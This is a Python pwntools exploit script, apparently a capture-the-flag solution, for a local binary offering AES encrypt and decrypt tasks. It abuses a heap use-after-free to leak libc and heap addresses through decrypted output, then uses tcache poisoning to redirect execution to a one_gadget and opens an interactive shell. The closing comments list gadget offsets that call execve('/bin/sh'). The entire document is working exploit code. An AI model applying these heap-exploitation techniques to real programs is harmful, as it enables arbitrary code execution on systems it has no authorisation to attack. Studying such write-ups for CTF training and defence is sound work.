from pwn import *
import random
import struct
import os
import binascii
import sys
import time
from Crypto.Cipher import AES #pycryptodome

# context.log_level="debug"
sh=process("./pwn")
elf=ELF("./pwn")
libc=ELF("./libc.so.6")

key = b'a' * 32
iv = b'b' * 16
def aes_decrypt(key, iv, data):
    aes_instance = AES.new(key, AES.MODE_CBC, iv)
    plain_text = aes_instance.decrypt(data)
    return plain_text
def cmd(c):
    sh.sendlineafter(b"Choice: ", str(c).encode())
def add(id, type, datasize, data, key=key, iv=iv):
    cmd(1)
    sh.sendlineafter(b"Task id : ", str(id).encode())
    sh.sendlineafter(b"Encrypt(1) / Decrypt(2): ", str(type).encode())
    sh.sendafter(b"Key : ", key)
    sh.sendafter(b"IV : ", iv)
    sh.sendlineafter(b"Data Size : ", str(datasize).encode())
    sh.sendafter(b"Data : ", data)
def dele(id):
    cmd(2)
    sh.sendlineafter(b"Task id : ", str(id).encode())
def go(id):
    cmd(3)
    sh.sendlineafter(b"Task id : ", str(id).encode())

add(0, 1, 0x410, b'a'*0x410)
add(1, 1, 0x410, b'a'*0x410)

go(1)
dele(0)
dele(1)

cmd(1)
sh.sendlineafter(b"Task id : ", str(1).encode())
sh.sendlineafter(b"Encrypt(1) / Decrypt(2): ", str(1).encode())
sh.sendafter(b"Key : ", key)
sh.sendafter(b"IV : ", iv)
sh.sendlineafter(b"Data Size : ", str(0x410).encode())

sh.recvuntil(b'Ciphertext: \n')
raw_data=sh.recvuntil(b'\n',drop=True)
splited_data=raw_data.split(b" ")[:-1]
cipher_data=b''.fromhex(b''.join(splited_data).decode())
plain_data=aes_decrypt(key,iv,cipher_data)
leak_libc=u64(plain_data[:8])
leak_heap=u64(plain_data[8:])
success("leak_libc:"+hex(leak_libc))
success("leak_heap:"+hex(leak_heap))
libcbase=leak_libc-0x3ebca0
heapbase=leak_heap-0x1b10
success("libcbase:"+hex(libcbase))
success("heapbase:"+hex(heapbase))
sh.send(b'a'*0x410)

add(2, 1, 0xb0, b'a'*0xb0) #cipher_chunk1 0xa0
add(3, 1, 0xb0, b'a'*0xb0) #cipher_chunk2 0xa0

gdb.attach(sh)

go(2)

dele(2) #heapbas+0x13010
dele(3)

#tchche: cipher_chunk2 -> cipher_chunk1
one_gadget=0x10a38c+libcbase
payload=p64(heapbase+0x1300)+p64(0x1000000020)+p64(0x1002)+p64(one_gadget)*2

add(3, 1, 0xa0, payload.ljust(0xa0,b'\x00')) #先malloc crypto 再malloc data

sh.interactive()

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL